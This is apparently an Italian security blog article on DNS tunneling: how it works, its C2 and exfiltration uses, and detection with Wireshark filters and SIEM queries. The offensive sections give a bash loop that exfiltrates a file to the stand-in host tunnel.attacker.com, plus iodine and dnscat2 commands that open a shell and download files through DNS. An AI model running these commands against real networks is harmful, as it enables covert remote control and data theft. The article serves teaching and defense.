---
title: 'DNS Tunneling: Cos''è, Attacco, Exfiltration e Detection'
slug: dns-tunneling
description: 'DNS Tunneling: cos’è e come funziona l’attacco con Iodine e dnscat2, DNS exfiltration, esempi pratici e detection del traffico DNS con Wireshark e SIEM.'
image: /dns-tunneling-attack-exfiltration-detection-hackita.webp
draft: false
date: 2026-11-02T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - DNS Tunneling
  - DNS Exfiltration
  - Network Security
  - Covert Channels
  - Red Team
---

# DNS Tunneling: Significato, Attacco CyberSecurity e Detection del Traffico

## Cos'è il DNS Tunneling

In parole semplici: il **DNS tunneling** (o **DNS tunnel**) è una tecnica che nasconde dati dentro le normali richieste DNS, quelle che il computer usa per tradurre un nome a dominio in un indirizzo IP. Invece di chiedere "a che IP risponde questo sito", la query trasporta comandi, file o l'output di una shell, mascherati da richieste `A`, `TXT`, `NULL` o `CNAME` come tante altre.

Viene usato in due contesti principali: come canale di **comando e controllo** (C2) per mantenere l'accesso a un host compromesso, e come canale di **DNS exfiltration** per far uscire dati da una rete senza passare per i protocolli normalmente monitorati (HTTP, HTTPS, SMB).

Nel framework MITRE ATT\&CK la tecnica è catalogata come [T1071.004 — Application Layer Protocol: DNS](https://attack.mitre.org/techniques/T1071/004/), sotto la categoria Command and Control.

![DNS tunneling traffic flow between a compromised host, a corporate resolver and an attacker-controlled nameserver](data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgOTAwIDQyMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBmb250LWZhbWlseT0iQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CjxkZWZzPgo8bWFya2VyIGlkPSJhcnJvdyIgdmlld0JveD0iMCAwIDEwIDEwIiByZWZYPSI5IiByZWZZPSI1IiBtYXJrZXJXaWR0aD0iOCIgbWFya2VySGVpZ2h0PSI4IiBvcmllbnQ9ImF1dG8tc3RhcnQtcmV2ZXJzZSI+CjxwYXRoIGQ9Ik0wLDAgTDEwLDUgTDAsMTAgeiIgZmlsbD0iI2ZmZmZmZiIgLz4KPC9tYXJrZXI+CjxtYXJrZXIgaWQ9ImFycm93UmVkIiB2aWV3Qm94PSIwIDAgMTAgMTAiIHJlZlg9IjkiIHJlZlk9IjUiIG1hcmtlcldpZHRoPSI4IiBtYXJrZXJIZWlnaHQ9IjgiIG9yaWVudD0iYXV0by1zdGFydC1yZXZlcnNlIj4KPHBhdGggZD0iTTAsMCBMMTAsNSBMMCwxMCB6IiBmaWxsPSIjZmYwMTAzIiAvPgo8L21hcmtlcj4KPC9kZWZzPgo8cmVjdCB4PSIwIiB5PSIwIiB3aWR0aD0iOTAwIiBoZWlnaHQ9IjQyMCIgZmlsbD0iIzZiMDAwMSIgLz4KPHJlY3QgeD0iNDAiIHk9IjYwIiB3aWR0aD0iMjAwIiBoZWlnaHQ9IjExMCIgZmlsbD0iIzAwMDAwMCIgc3Ryb2tlPSIjZmYwMTAzIiBzdHJva2Utd2lkdGg9IjIiIC8+Cjx0ZXh0IHg9IjE0MCIgeT0iMTA1IiBmaWxsPSIjZmZmZmZmIiBmb250LXNpemU9IjE4IiBmb250LXdlaWdodD0iNzAwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5Db21wcm9taXNlZDwvdGV4dD4KPHRleHQgeD0iMTQwIiB5PSIxMjgiIGZpbGw9IiNmZmZmZmYiIGZvbnQtc2l6ZT0iMTgiIGZvbnQtd2VpZ2h0PSI3MDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkhvc3Q8L3RleHQ+Cjx0ZXh0IHg9IjE0MCIgeT0iMTU1IiBmaWxsPSIjZmZmZmZmIiBmb250LXNpemU9IjEzIiBmb250LXdlaWdodD0iNDAwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5pb2RpbmUgY2xpZW50IC8gZG5zY2F0MjwvdGV4dD4KPHJlY3QgeD0iMzUwIiB5PSI2MCIgd2lkdGg9IjIwMCIgaGVpZ2h0PSIxMTAiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIiAvPgo8dGV4dCB4PSI0NTAiIHk9IjEwNSIgZmlsbD0iI2ZmZmZmZiIgZm9udC1zaXplPSIxOCIgZm9udC13ZWlnaHQ9IjcwMCIgdGV4dC1hbmNob3I9Im1pZGRsZSI+Q29ycG9yYXRlPC90ZXh0Pgo8dGV4dCB4PSI0NTAiIHk9IjEyOCIgZmlsbD0iI2ZmZmZmZiIgZm9udC1zaXplPSIxOCIgZm9udC13ZWlnaHQ9IjcwMCIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RE5TIFJlc29sdmVyPC90ZXh0Pgo8dGV4dCB4PSI0NTAiIHk9IjE1NSIgZmlsbD0iI2ZmZmZmZiIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjQwMCIgdGV4dC1hbmNob3I9Im1pZGRsZSI+Zm9yd2FyZHMgcXVlcnkgdXBzdHJlYW08L3RleHQ+CjxyZWN0IHg9IjY2MCIgeT0iNjAiIHdpZHRoPSIyMDAiIGhlaWdodD0iMTEwIiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIgLz4KPHRleHQgeD0iNzYwIiB5PSIxMDUiIGZpbGw9IiNmZmZmZmYiIGZvbnQtc2l6ZT0iMTgiIGZvbnQtd2VpZ2h0PSI3MDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkF1dGhvcml0YXRpdmU8L3RleHQ+Cjx0ZXh0IHg9Ijc2MCIgeT0iMTI4IiBmaWxsPSIjZmZmZmZmIiBmb250LXNpemU9IjE4IiBmb250LXdlaWdodD0iNzAwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5OUyBTZXJ2ZXI8L3RleHQ+Cjx0ZXh0IHg9Ijc2MCIgeT0iMTU1IiBmaWxsPSIjZmZmZmZmIiBmb250LXNpemU9IjEzIiBmb250LXdlaWdodD0iNDAwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5hdHRhY2tlciBjb250cm9sbGVkPC90ZXh0Pgo8bGluZSB4MT0iMjQwIiB5MT0iMTE1IiB4Mj0iMzUwIiB5Mj0iMTE1IiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMiIgbWFya2VyLWVuZD0idXJsKCNhcnJvdykiIC8+Cjx0ZXh0IHg9IjI5NSIgeT0iMTAwIiBmaWxsPSIjZmZmZmZmIiBmb250LXNpemU9IjEyIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5UWFQvTlVMTCBxdWVyeTwvdGV4dD4KPGxpbmUgeDE9IjU1MCIgeTE9IjExNSIgeDI9IjY2MCIgeTI9IjExNSIgc3Ryb2tlPSIjZmZmZmZmIiBzdHJva2Utd2lkdGg9IjIiIG1hcmtlci1lbmQ9InVybCgjYXJyb3cpIiAvPgo8dGV4dCB4PSI2MDUiIHk9IjEwMCIgZmlsbD0iI2ZmZmZmZiIgZm9udC1zaXplPSIxMiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+cmVjdXJzaXZlIGxvb2t1cDwvdGV4dD4KPGxpbmUgeDE9IjY2MCIgeTE9IjE1MCIgeDI9IjU1MCIgeTI9IjE1MCIgc3Ryb2tlPSIjZmYwMTAzIiBzdHJva2Utd2lkdGg9IjIiIG1hcmtlci1lbmQ9InVybCgjYXJyb3dSZWQpIiAvPgo8dGV4dCB4PSI2MDUiIHk9IjE4NSIgZmlsbD0iI2ZmZmZmZiIgZm9udC1zaXplPSIxMiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+ZW5jb2RlZCByZXNwb25zZTwvdGV4dD4KPGxpbmUgeDE9IjM1MCIgeTE9IjE1MCIgeDI9IjI0MCIgeTI9IjE1MCIgc3Ryb2tlPSIjZmYwMTAzIiBzdHJva2Utd2lkdGg9IjIiIG1hcmtlci1lbmQ9InVybCgjYXJyb3dSZWQpIiAvPgo8dGV4dCB4PSIyOTUiIHk9IjE4NSIgZmlsbD0iI2ZmZmZmZiIgZm9udC1zaXplPSIxMiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+QzIgLyBleGZpbCBkYXRhPC90ZXh0Pgo8cmVjdCB4PSI0MCIgeT0iMjYwIiB3aWR0aD0iODIwIiBoZWlnaHQ9IjExMCIgZmlsbD0iIzAwMDAwMCIgc3Ryb2tlPSIjZmYwMTAzIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1kYXNoYXJyYXk9IjYsNCIgLz4KPHRleHQgeD0iNDUwIiB5PSIyOTUiIGZpbGw9IiNmZmZmZmYiIGZvbnQtc2l6ZT0iMTYiIGZvbnQtd2VpZ2h0PSI3MDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiPldoeSBpdCBieXBhc3NlcyBmaXJld2FsbHM8L3RleHQ+Cjx0ZXh0IHg9IjQ1MCIgeT0iMzI1IiBmaWxsPSIjZmZmZmZmIiBmb250LXNpemU9IjEzIiBmb250LXdlaWdodD0iNDAwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5Qb3J0IDUzIGlzIGFsbW9zdCBhbHdheXMgb3BlbiBvdXRib3VuZDwvdGV4dD4KPHRleHQgeD0iNDUwIiB5PSIzNDgiIGZpbGw9IiNmZmZmZmYiIGZvbnQtc2l6ZT0iMTMiIGZvbnQtd2VpZ2h0PSI0MDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkROUyB0cmFmZmljIGlzIHJhcmVseSBpbnNwZWN0ZWQgcGF5bG9hZC1ieS1wYXlsb2FkPC90ZXh0Pgo8L3N2Zz4K)

## Come funziona il DNS Tunneling

Il meccanismo sfrutta il modo in cui funziona la risoluzione DNS ricorsiva. Se l'attaccante registra un dominio (es. `tunnel.attacker.com`) e ne diventa il server `NS` autoritativo, ogni query per un sottodominio di quel dominio finisce, prima o poi, sul suo server.

Il flusso è questo:

1. Sull'host compromesso gira un client che codifica i dati (comando, file, output) in **Base32** o **Base64 modificato** (il set di caratteri ammessi nei nomi DNS è limitato).
2. I dati codificati diventano un sottodominio: `4d6573736167652d656e636f646564.tunnel.attacker.com`.
3. Il resolver interno dell'azienda non conosce quel dominio, quindi inoltra la query verso l'alto, fino ad arrivare al server autoritativo dell'attaccante.
4. Il server dell'attaccante decodifica il sottodominio, esegue l'azione richiesta (o la mette in coda) e restituisce la risposta codificata dentro un record `TXT` o `NULL`.
5. Il client sull'host decodifica la risposta.

```text
client -> query: <base32(payload)>.tunnel.attacker.com (type TXT)
server -> response: TXT "<base32(output)>"
```

tradotto: il payload viaggia nel nome della query, l'output della shell nella risposta.

## Perché bypassa i firewall

Il DNS tunneling funziona così bene in fase di evasione per due motivi molto concreti:

* la porta **53/UDP** (e sempre più spesso 53/TCP) è quasi sempre aperta in uscita, perché senza DNS funzionante la rete smette di funzionare;
* la maggior parte dei firewall e dei proxy ispeziona il traffico HTTP/HTTPS in modo molto più aggressivo del traffico DNS, che viene spesso trattato come "di servizio" e lasciato passare senza controlli applicativi.

Questo lo rende interessante sia per mantenere un **C2** attivo in reti fortemente segmentate, sia per far uscire dati quando tutti gli altri canali (upload HTTP, email, USB) sono bloccati o monitorati.

## DNS Tunneling Attack: scenari reali

Gli usi offensivi più comuni sono tre:

**Command and Control.** L'host compromesso polla periodicamente il dominio dell'attaccante chiedendo "ci sono comandi in coda?". Il server risponde con il comando codificato in un record TXT, l'host lo esegue e invia l'output alla query successiva. È lento (il DNS non è pensato per throughput alto) ma estremamente difficile da bloccare senza rompere la risoluzione dei nomi.

**Esfiltrazione dati.** Vedi la sezione dedicata più sotto.

**Bypass di captive portal e reti Wi-Fi a pagamento.** Molti captive portal lasciano passare le query DNS prima dell'autenticazione per permettere la risoluzione del portale stesso. Un tunnel DNS (storicamente il progetto NSTX, oggi più spesso Iodine) permette di avere accesso a Internet gratuito incapsulando IP dentro DNS. È la stessa tecnica, applicazione diversa.

## DNS Exfiltration: come viene rubato un file

Per esfiltrare un file via DNS, il client lo spezza in blocchi che rispettano i limiti del protocollo: ogni **label** (la porzione tra due punti) può arrivare al massimo a 63 caratteri, e il nome completo della query non può superare i 253 caratteri.

```bash
# split del file in chunk da 60 byte, poi encoding Base32 per ogni chunk
split -b 60 secret.zip chunk_
for f in chunk_*; do
  echo "$(cat "$f" | base32 -w0).data.tunnel.attacker.com"
done
```

tradotto: ogni riga di output diventa una query DNS; sul server autoritativo basta loggare le query in arrivo e ricostruire i chunk nell'ordine giusto.

La velocità reale è bassa: tra overhead di encoding, latenza di rete e limiti di dimensione dei record, si parla tipicamente di pochi KB/s con Iodine in condizioni normali, meno con un tunnel DNS "puro" via TXT fatto a mano. Per questo la DNS exfiltration viene usata per credenziali, chiavi, piccoli archivi — non per spostare database interi.

## Tool: Iodine (DNS Tunneling via IP)

[Iodine](https://github.com/yarrick/iodine) crea un vero tunnel **IP-over-DNS**: sull'host compromesso appare un'interfaccia di rete (`dns0`) su cui instradare qualunque traffico, non solo comandi testuali.

Setup lato server (sul dominio di cui controlli l'NS):

```bash
# avvia il server iodine, assegna la subnet del tunnel e il dominio delegato
iodined -f -c -P mypassword 10.0.0.1 tunnel.attacker.com
```

tradotto: `-c` disabilita il controllo IP del client (utile dietro NAT), `-P` è la password condivisa, `10.0.0.1` è l'IP del server dentro il tunnel.

Setup lato client:

```bash
# connette al server iodine attraverso il DNS del resolver locale
iodine -f -P mypassword tunnel.attacker.com
```

A questo punto `dns0` è un'interfaccia IP a tutti gli effetti: ci si può instradare SSH, un proxy SOCKS con `ssh -D`, o qualunque altro traffico.

```bash
# una volta che il tunnel iodine è up, pivot completo via SOCKS su SSH
ssh -D 1080 user@10.0.0.1
```

Throughput tipico: 10–50 KB/s a seconda del tipo di record DNS usato (NULL e TXT danno risultati migliori di A/CNAME) e della presenza di filtri che limitano le risposte EDNS0.

Nota pratica: Iodine non ha un porting nativo per Windows mantenuto bene. In un test autorizzato da un host Windows conviene compilarlo ed eseguirlo dentro `WSL` (Windows Subsystem for Linux), così il tunnel gira in un ambiente Linux completo senza dover uscire dalla macchina target.

## Tool: dnscat2 (C2 nativo su DNS)

A differenza di Iodine, [dnscat2](https://github.com/iagox86/dnscat2) non crea un'interfaccia IP: è un C2 pensato apposta per girare su DNS, con sessioni multiple, file transfer e un comando `shell` o `exec` integrato.

```bash
# server dnscat2, con dominio delegato (serve un NS autoritativo reale)
ruby dnscat2.rb tunnel.attacker.com
```

```bash
# client, stesso dominio
./dnscat2 tunnel.attacker.com
```

Senza un dominio delegato funziona comunque in modalità diretta (`dnscat2 --dns server=1.2.3.4,port=53`), ma in quel caso il traffico non attraversa la catena di resolver ricorsivi: è utile in lab, molto meno realistico come simulazione di un attacco reale, dove il valore di dnscat2 sta proprio nell'attraversare resolver che l'attaccante non controlla.

Dentro la sessione:

```text
dnscat2> window -i 1
command (user@host) > shell
command (user@host) > download C:\Users\user\secret.txt
```

tradotto: `window -i` entra nella sessione, `shell` apre una shell interattiva incapsulata in DNS, `download` esfiltra un file a blocchi.

## DNS over HTTPS Tunneling

Una variante più recente usa `DNS over HTTPS` invece del DNS in chiaro su UDP/53. Il traffico esce come normale HTTPS verso un resolver pubblico (Cloudflare, Google), il che lo rende ancora più difficile da distinguere dal traffico web legittimo — e bypassa completamente i controlli che filtrano solo la porta 53.

Tool come [dnscat2-doh](https://github.com/qrsuser/dnscat2-doh) o proxy DoH custom instradano le stesse query incapsulate dentro richieste HTTPS verso endpoint come `https://cloudflare-dns.com/dns-query`. Dal punto di vista del proxy aziendale, è traffico TLS verso un dominio reputato affidabile.

Questo è anche il motivo per cui molte aziende, nel loro programma di **DNS tunneling prevention**, oggi bloccano o instradano forzatamente tutte le risoluzioni DoH verso il proprio resolver interno, invece di lasciare che ogni host scelga il proprio.

## DNS Covert Channel e classificazione MITRE ATT\&CK

Il termine `DNS covert channel` indica in generale qualunque canale nascosto che usi il protocollo DNS per trasportare dati non previsti dal protocollo stesso — il DNS tunneling ne è il caso più comune e documentato.

Oltre a T1071.004 citata sopra, la tecnica compare come sotto-tecnica anche in:

* [T1048 — Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/), quando il DNS viene usato specificamente per far uscire dati.
* Diversi malware e famiglie C2 reali la implementano: `OilRig`/`APT34` ha usato DNS tunneling in più campagne documentate da threat intelligence pubblica, e framework C2 come [Cobalt Strike](https://hackita.it/articoli/cobaltstrike/) e [Sliver](https://hackita.it/articoli/silver/) supportano canali DNS come listener alternativo a HTTP/HTTPS.

## DNS Tunneling Detection con Wireshark

Dal punto di vista difensivo, il traffico DNS tunneling ha caratteristiche riconoscibili rispetto al traffico DNS normale, anche solo guardando i pacchetti.

Segnali da cercare in [Wireshark](https://hackita.it/articoli/wireshark/):

* volume anomalo di query verso lo stesso dominio di secondo livello, specialmente record `TXT` e `NULL`;
* sottodomini lunghi, con entropia alta e caratteri che sembrano casuali (tipico dell'encoding Base32/Base64);
* query molto frequenti e regolari verso lo stesso dominio, da un singolo host, fuori dal pattern normale di navigazione;
* dimensione delle risposte vicina al limite massimo consentito (segno di payload "spinto" al massimo per ottimizzare il throughput).

Filtro pratico per isolare traffico sospetto:

```text
dns.qry.name.len > 50 && dns.flags.response == 0
```

tradotto: filtra tutte le query DNS il cui nome supera i 50 caratteri — soglia ragionevole per intercettare sottodomini codificati, che un nome a dominio umano normale raramente raggiunge.

Un secondo filtro utile isola la frequenza:

```text
dns.qry.name contains "tunnel" or dns.qry.type == 16
```

tradotto: il tipo `16` corrisponde ai record `TXT`, molto più usati nel tunneling che nella navigazione normale.

## DNS Tunneling Detection con SIEM

A livello di SIEM, la detection si basa su analisi statistica del traffico DNS piuttosto che su singole query, perché una singola query sospetta non basta a distinguere un tunnel da un CDN con nomi generati dinamicamente.

Indicatori che si prestano bene a una regola o a una query di ricerca:

* **conteggio di query per dominio per host**, in una finestra temporale breve (es. più di 100 query/minuto verso lo stesso dominio di secondo livello);
* **entropia media dei sottodomini** interrogati da un host, calcolata su base giornaliera;
* **rapporto tra query e risposte NXDOMAIN**: un tunnel mal configurato o un client che tenta domini non ancora registrati genera molti NXDOMAIN;
* **lunghezza media dei nomi di dominio interrogati** da un host, confrontata con la baseline della rete.

Esempio di query concettuale (adattabile a Splunk/KQL/Sigma a seconda del SIEM):

```text
index=dns | stats count by src_ip, query_domain | where count > 100
```

tradotto: raggruppa le query DNS per host sorgente e dominio interrogato, segnala chi supera una soglia di volume anomala.

Molti EDR e DNS firewall moderni (Cisco Umbrella, Zscaler, CrowdStrike Falcon) includono già modelli di machine learning dedicati specificamente al rilevamento di DNS tunneling basati su questi stessi principi statistici.

## Prevenzione e mitigazione

Qualunque sia l'ambiente, alcune misure riducono concretamente la superficie d'attacco:

* **forzare tutte le risoluzioni DNS** (inclusa DoH/DoT) attraverso il resolver aziendale, bloccando l'uscita diretta verso resolver pubblici esterni sulla 53/UDP e TCP;
* **rate limiting** sulle query DNS per host, con alert su volumi anomali verso lo stesso dominio;
* **DNS firewall/sinkhole** con reputazione dei domini, per bloccare domini registrati di recente o con pattern sospetti;
* **monitoraggio della lunghezza e dell'entropia** dei nomi a dominio interrogati, come descritto nella sezione detection;
* **segmentazione di rete**, per limitare quali host possono fare query DNS dirette verso l'esterno invece che solo verso il resolver interno.

Nessuna di queste misure, da sola, blocca un tunnel ben fatto al 100%: la combinazione di controllo del traffico in uscita e detection comportamentale resta la difesa più efficace.

## FAQ

**Il DNS tunneling è rilevabile sempre?**
No. Un tunnel ben progettato, con basso volume di query e domini che non destano sospetti, può restare sotto la soglia delle regole di detection standard per molto tempo. Per questo la detection comportamentale (volume, entropia, baseline) funziona meglio della ricerca di singole signature.

**Qual è la differenza tra DNS tunneling e DNS exfiltration?**
Il DNS tunneling è la tecnica generale di incapsulare dati nel protocollo DNS; la DNS exfiltration è uno degli usi possibili di quella tecnica, specificamente per far uscire dati da una rete.

**Iodine o dnscat2, quale scegliere in un test autorizzato?**
Dipende dall'obiettivo: Iodine dà un tunnel IP completo (utile per pivoting con qualunque strumento), dnscat2 è più leggero e pensato per C2 testuale/file transfer con meno overhead di setup.

***

Come sempre con questo tipo di tecniche, il punto di forza offensivo (bypassare i controlli perimetrali) coincide con il punto debole difensivo da presidiare per primo: se il DNS in uscita non è forzato attraverso un resolver monitorato, un tunnel ben costruito ha gioco facile. Vale per il DNS tunneling come per qualunque altro canale di esfiltrazione: la detection comportamentale resta sempre più affidabile della singola signature.
